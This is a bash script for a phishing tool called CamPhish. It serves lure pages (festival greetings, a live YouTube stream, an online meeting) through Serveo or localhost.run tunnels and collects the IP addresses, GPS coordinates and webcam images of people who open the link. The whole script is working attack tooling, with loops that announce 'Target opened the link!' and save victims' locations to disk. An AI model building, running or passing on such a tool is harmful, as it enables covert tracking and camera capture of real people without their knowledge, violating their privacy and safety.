#!/bin/bash

trap 'printf "\n"; stop' 2

# bro don't think to run this in windows environment.
check_windows() {
    is_windows=false
    if [[ "$OS" == "Windows_NT" ]]; then
        is_windows=true
    else
        unameOut=$(uname -s 2>/dev/null || echo "")
        case "$unameOut" in
            *CYGWIN*|*MINGW*|*MSYS*) is_windows=true ;;
            *) is_windows=false ;;
        esac
    fi
    if [[ "$is_windows" == true ]]; then
        times_file="$(pwd)/times-opened.txt"
        # ensure file exists
        if [[ ! -f "$times_file" ]]; then
            printf "0" > "$times_file"
        fi
        # read, increment and save
        count=$(cat "$times_file" 2>/dev/null || echo 0)
        if ! [[ "$count" =~ ^[0-9]+$ ]]; then count=0; fi
        count=$((count+1))
        printf "%d" "$count" > "$times_file"
        messages=(
            "Whoa there, Windows wanderer. This script prefers penguins. (#N)"
            "Attempt #N: The terminal snickers — you really ran this on Windows."
            "Attempt #N: Linux says: \"Install a distro, it\'s fun.\""
            "Attempt #N: Error: Too many Windows. Please try rebooting into Linux."
            "Attempt #N: The Bash on Windows trembles. The penguin is amused."
            "Attempt #N: Are you testing my patience or your OS? Either way, Linux wins."
            "Attempt #N: Pro tip: real devs use Linux. This is why."
            "Attempt #N: The script detected Windows. It laughed, then left."
            "Attempt #N: You keep opening me on Windows — this is getting personal."
            "Attempt #N: Last warning: switch to Linux or accept eternal teasing."
        )
        idx=$(( (count-1) % ${#messages[@]} ))
        msg="${messages[$idx]}"
        msg="${msg//\#N/$count}"
        printf "\n\e[1;31m[!] Linux-Nerd Error:\e[0m %s\n\n" "$msg"
        exit 1
    fi
}
check_windows
banner() {
    clear
    printf "\n"
    printf "\e[1;31m  ================================================================\e[0m\n"
    printf "\e[1;31m  #\e[1;91m                                                               \e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m     ██████\e[0;31m╗\e[1;91m █████\e[0;31m╗\e[1;91m ███\e[0;31m╗\e[1;91m   ███\e[0;31m╗\e[1;91m██████\e[0;31m╗\e[1;91m ██╗\e[0;31m  \e[1;91m██╗\e[0;31m\e[1;91m██╗\e[0;31m\e[1;91m███████\e[0;31m╗\e[1;91m██╗\e[0;31m  \e[1;91m██╗\e[0;31m\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m    ██\e[0;31m╔══\e[1;91m══╝\e[0;31m██╔══\e[1;91m██╗\e[0;31m████╗ \e[1;91m████║\e[0;31m██╔══\e[1;91m██╗\e[0;31m██║  \e[1;91m██║\e[0;31m██║\e[1;91m██╔════╝\e[0;31m██║  \e[1;91m██║\e[0;31m\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m    ██║\e[0;31m     \e[1;91m███████║\e[0;31m██╔\e[1;91m████╔\e[0;31m██║\e[1;91m██████╔╝\e[0;31m███████║\e[1;91m██║\e[0;31m\e[1;91m███████╗\e[0;31m███████║\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m    ██║\e[0;31m     \e[1;91m██╔══\e[0;31m██║\e[1;91m██║╚\e[0;31m██╔╝\e[1;91m██║\e[0;31m██╔═══╝ \e[1;91m██╔══\e[0;31m██║\e[1;91m██║\e[0;31m\e[1;91m╚════\e[0;31m██║\e[1;91m██╔══\e[0;31m██║\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m    ╚\e[0;31m██████╗\e[1;91m██║\e[0;31m  \e[1;91m██║\e[0;31m██║ ╚═╝ \e[1;91m██║\e[0;31m██║     \e[1;91m██║\e[0;31m  \e[1;91m██║\e[0;31m██║\e[1;91m███████║\e[0;31m██║  \e[1;91m██║\e[0;31m\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m     ╚═════╝\e[0;31m╚═╝  \e[1;91m╚═╝\e[0;31m╚═╝     \e[1;91m╚═╝\e[0;31m╚═╝     \e[1;91m╚═╝\e[0;31m  \e[1;91m╚═╝\e[0;31m╚═╝\e[1;91m╚══════╝\e[0;31m╚═╝  \e[1;91m╚═╝\e[0;31m\e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m                                                               \e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;36m   >>  Webcam + GPS Capture  |  v2.1  <<                      \e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[0;90m   Serveo & localhost.run | Kali | Termux | Ubuntu | Parrot   \e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[1;91m   * \e[0mCreated by \e[1;97mInfinity x White Devels Team\e[0m \e[1;31m                            \e[1;31m#\e[0m\n"
    printf "\e[1;31m  #\e[0;90m   Based on TechChip | Modified by Uzair Developer               \e[1;31m#\e[0m\n"
    printf "\e[1;31m  ================================================================\e[0m\n\n"
}
dependencies() {
    if ! command -v php > /dev/null 2>&1; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] PHP not found. Install: sudo apt install php\e[0m\n"
        exit 1
    fi
    if ! command -v ssh > /dev/null 2>&1; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] SSH not found. Install: sudo apt install ssh\e[0m\n"
        exit 1
    fi
    printf "\e[1;31m[\e[1;91m*\e[1;31m] Dependencies OK\e[0m\n"
}
stop() {
    pkill -P $$ > /dev/null 2>&1
    pkill -f -2 php > /dev/null 2>&1
    pkill -f -2 ssh > /dev/null 2>&1
    jobs -p | xargs -r kill > /dev/null 2>&1
    if [[ -f ".monitor_pid" ]]; then
        monitor_pid=$(cat .monitor_pid 2>/dev/null)
        kill $monitor_pid 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt location_* LocationLog.log Log.log > /dev/null 2>&1
    printf "\n\e[1;31m[\e[1;91m*\e[1;31m] Stopped. Created by Infinity x White Devels Team\e[0m\n"
    exit 1
}
catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;31m[\e[1;91m+\e[1;31m] IP:\e[0m\e[1;36m %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
}
catch_location() {
    if [[ -e "current_location.txt" ]]; then
        printf "\e[1;31m[\e[1;91m+\e[1;31m] Current location data:\e[0m\n"
        grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
        mv current_location.txt "saved_locations/$(date +%s).txt"
    elif [[ -e "location_"* ]]; then
        loc_file=$(ls location_* | head -1)
        lat=$(grep -a 'Latitude:' "$loc_file" | cut -d " " -f2)
        lon=$(grep -a 'Longitude:' "$loc_file" | cut -d " " -f2)
        acc=$(grep -a 'Accuracy:' "$loc_file" | cut -d " " -f2)
        maps=$(grep -a 'Google Maps:' "$loc_file" | cut -d " " -f3)
        printf "\e[1;31m[\e[1;91m+\e[1;31m] Latitude:\e[0m\e[1;36m %s\e[0m\n" "$lat"
        printf "\e[1;31m[\e[1;91m+\e[1;31m] Longitude:\e[0m\e[1;36m %s\e[0m\n" "$lon"
        printf "\e[1;31m[\e[1;91m+\e[1;31m] Accuracy:\e[0m\e[1;36m %s meters\e[0m\n" "$acc"
        printf "\e[1;31m[\e[1;91m+\e[1;31m] Google Maps:\e[0m\e[1;36m %s\e[0m\n" "$maps"
        [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
        mv "$loc_file" "saved_locations/"
        printf "\e[1;31m[\e[1;91m*\e[1;31m] Location saved.\e[0m\n"
    else
        printf "\e[1;31m[\e[1;91m!\e[1;31m] No location found.\e[0m\n"
    fi
}
checkfound() {
    [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
    printf "\n\e[1;31m[\e[1;91m*\e[1;31m] Waiting for targets... Ctrl+C to exit.\e[0m\n"
    printf "\e[1;31m[\e[1;91m*\e[1;31m] GPS tracking: \e[1;91mACTIVE\e[0m\n"
    printf "\e[1;31m[\e[1;91m*\e[1;31m] Webcam capture: \e[1;91mACTIVE\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;31m[\e[1;91m+\e[1;31m] Target opened the link!\e[0m\n"
            catch_ip
            rm -f ip.txt
        fi
        if [[ -e "LocationLog.log" ]] || [[ -e "current_location.txt" ]]; then
            printf "\n\e[1;31m[\e[1;91m+\e[1;31m] Location data received!\e[0m\n"
            catch_location
            rm -f LocationLog.log
        fi
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;31m[\e[1;91m+\e[1;31m] Camera image received!\e[0m\n"
            rm -f Log.log
        fi
        sleep 0.5
    done
}
serveo_tunnel() {
    printf "\e[1;31m[\e[1;91m+\e[1;31m] Starting PHP server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;31m[\e[1;91m+\e[1;31m] Starting Serveo tunnel (port 3333)...\e[0m\n"
    ssh -R 80:localhost:3333 serveo.net > serveo.log 2>&1 &
    sleep 8
    if ! pgrep -f "ssh.*serveo" > /dev/null; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] Serveo failed to start.\e[0m\n"
        exit 1
    fi
    link=$(grep -o 'https://[a-zA-Z0-9-]*\.serveo\.net' serveo.log | head -1)
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] Could not retrieve Serveo URL.\e[0m\n"
        exit 1
    fi
    printf "\e[1;31m[\e[1;91m*\e[1;31m] Direct link:\e[0m\e[1;36m %s\e[0m\n" "$link"
    echo "$link" > sendlink
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;31m[\e[1;91m*\e[1;31m] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;31m[\e[1;91m*\e[1;31m] Link copied to clipboard!\e[0m\n"; fi
    payload_template "$link"
    checkfound
}
localhost_run_tunnel() {
    printf "\e[1;31m[\e[1;91m+\e[1;31m] Starting PHP server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;31m[\e[1;91m+\e[1;31m] Starting localhost.run tunnel...\e[0m\n"
    ssh -R 80:127.0.0.1:3333 nokey@localhost.run > localhostrun.log 2>&1 &
    ssh_pid=$!
    sleep 5
    if ! ps -p $ssh_pid > /dev/null; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] localhost.run SSH failed to start.\e[0m\n"
        exit 1
    fi
    printf "\e[1;31m[\e[1;91m*\e[1;31m] Waiting for tunnel URL...\e[0m\n"
    link=""
    attempts=0
    while [[ -z "$link" && $attempts -lt 20 ]]; do
        if [[ -f "localhostrun.log" ]]; then
            link=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
        fi
        sleep 1
        ((attempts++))
    done
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] Could not retrieve localhost.run URL.\e[0m\n"
        exit 1
    fi
    printf "\e[1;31m[\e[1;91m*\e[1;31m] Direct link:\e[0m\e[1;36m %s\e[0m\n" "$link"
    echo "$link" > sendlink
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;31m[\e[1;91m*\e[1;31m] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;31m[\e[1;91m*\e[1;31m] Link copied to clipboard!\e[0m\n"; fi
    payload_template "$link"
    (
        last_url="$link"
        while true; do
            sleep 10
            if ! ps -p $PPID > /dev/null 2>&1; then
                exit 0
            fi
            if [[ -f "localhostrun.log" ]]; then
                new_url=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
                if [[ -n "$new_url" && "$new_url" != "$last_url" ]]; then
                    printf "\n\e[1;31m[\e[1;91m!\e[1;31m] URL CHANGED!\e[0m\n"
                    printf "\e[1;31m[\e[1;91m*\e[1;31m] New link:\e[0m\e[1;36m %s\e[0m\n" "$new_url"
                    echo "$new_url" > sendlink
                    last_url="$new_url"
                    payload_template "$new_url"
                fi
            fi
        done
    ) &
    monitor_pid=$!
    echo $monitor_pid > .monitor_pid
    checkfound
}
payload_template() {
    local forwarding_link="$1"
    if [[ ! -f "template.php" ]]; then
        printf "\e[1;31m[\e[1;91m!\e[1;31m] Error: template.php not found!\e[0m\n"
        return 1
    fi
    sed "s|forwarding_link|$forwarding_link|g" template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        if [[ ! -f "festivalwishes.html" ]]; then
            printf "\e[1;31m[\e[1;91m!\e[1;31m] Error: festivalwishes.html not found!\e[0m\n"
            return 1
        fi
        if [[ "$fest_variant" -eq 2 ]]; then
            template_file="festivalwishes_islamic.html"
        else
            template_file="festivalwishes.html"
        fi
        escaped_fest_name=$(printf '%s' "$fest_name" | sed 's/[\\/&]/\\&/g')
        sed "s|forwarding_link|$forwarding_link|g; s|fes_name|$escaped_fest_name|g" "$template_file" > index2.html
        cp index2.html index.html
    elif [[ $option_tem -eq 2 ]]; then
        if [[ ! -f "LiveYTTV.html" ]]; then
            printf "\e[1;31m[\e[1;91m!\e[1;31m] Error: LiveYTTV.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" LiveYTTV.html > index2.html
        sed "s|live_yt_tv|$yt_video_ID|g" index2.html > index.html
    else
        if [[ ! -f "OnlineMeeting.html" ]]; then
            printf "\e[1;31m[\e[1;91m!\e[1;31m] Error: OnlineMeeting.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" OnlineMeeting.html > index.html
    fi
    if [[ -f "index.html" ]]; then
        printf "\e[1;31m[\e[1;91m*\e[1;31m] Template generated successfully\e[0m\n"
    else
        printf "\e[1;31m[\e[1;91m!\e[1;31m] Error: Failed to generate index.html\e[0m\n"
        return 1
    fi
}
select_template() {
    printf "\n\e[1;31m  ----- Choose a Template -----\e[0m\n"
    printf "\e[1;31m  [\e[1;91m01\e[1;31m]\e[0m \e[1;36mFestival Wishing\e[0m\n"
    printf "\e[1;31m  [\e[1;91m02\e[1;31m]\e[0m \e[1;36mLive YouTube TV\e[0m\n"
    printf "\e[1;31m  [\e[1;91m03\e[1;31m]\e[0m \e[1;36mOnline Meeting\e[0m\n"
    read -p $'\n\e[1;31m[\e[1;91m+\e[1;31m] Choose template \e[0m[\e[1;36m1\e[0m]: \e[0m' option_tem
    option_tem="${option_tem:-1}"
    case "$option_tem" in
          1) read -p $'\e[1;31m[\e[1;91m+\e[1;31m] Enter festival name: \e[0m' fest_name;
              fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
              read -p $'\e[1;31m[\e[1;91m+\e[1;31m] Style: 1)Indian  2)Islamic \e[0m[\e[1;36m1\e[0m]: \e[0m' fest_variant
              fest_variant="${fest_variant:-1}" ;;
        2) read -p $'\e[1;31m[\e[1;91m+\e[1;31m] Enter YouTube video ID: \e[0m' yt_video_ID ;;
        3) : ;;
        *) printf "\e[1;31m[\e[1;91m!\e[1;31m] Invalid option!\e[0m\n"; sleep 1; select_template ;;
    esac
}
camphish() {
    if [[ -f ".monitor_pid" ]]; then
        old_monitor=$(cat .monitor_pid 2>/dev/null)
        kill $old_monitor 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt serveo.log localhostrun.log
    printf "\n\e[1;31m  ----- Choose Tunneling Service -----\e[0m\n"
    printf "\e[1;31m  [\e[1;91m01\e[1;31m]\e[0m \e[1;36mServeo.net\e[0m \e[0;90m(fast)\e[0m\n"
    printf "\e[1;31m  [\e[1;91m02\e[1;31m]\e[0m \e[1;36mlocalhost.run\e[0m \e[0;90m(backup)\e[0m\n"
    read -p $'\n\e[1;31m[\e[1;91m+\e[1;31m] Choose tunnel \e[0m[\e[1;36m1\e[0m]: \e[0m' option_server
    option_server="${option_server:-1}"
    select_template
    case "$option_server" in
        1) serveo_tunnel ;;
        2) localhost_run_tunnel ;;
        *) printf "\e[1;31m[\e[1;91m!\e[1;31m] Invalid option!\e[0m\n"; sleep 1; camphish ;;
    esac
}
banner
dependencies
camphish